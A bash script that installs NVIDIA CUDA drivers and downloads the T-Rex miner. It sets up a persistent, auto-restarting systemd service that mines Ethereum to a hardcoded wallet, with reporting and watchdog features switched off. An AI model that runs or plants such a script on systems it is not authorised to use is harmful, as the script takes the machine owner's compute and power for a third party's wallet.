SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
	echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
	sudo apt-get update
	sudo apt-get -y install cuda-drivers
	sudo apt-get install libcurl3 -y
	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz
	sudo tar xvzf t-rex-0.23.1-linux.tar.gz
	sudo bash -c "echo -e \"[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/t-rex -a ethash -o stratum+tcp://us1.ethermine.org:4444 -u 0xDA00008E0F55B322e532C5974eF46AbA41a64091 -p x -w $1 --no-hashrate-report --no-nvml --no-watchdog\n\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/eth.service"
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
else
	sudo systemctl start eth.service
fi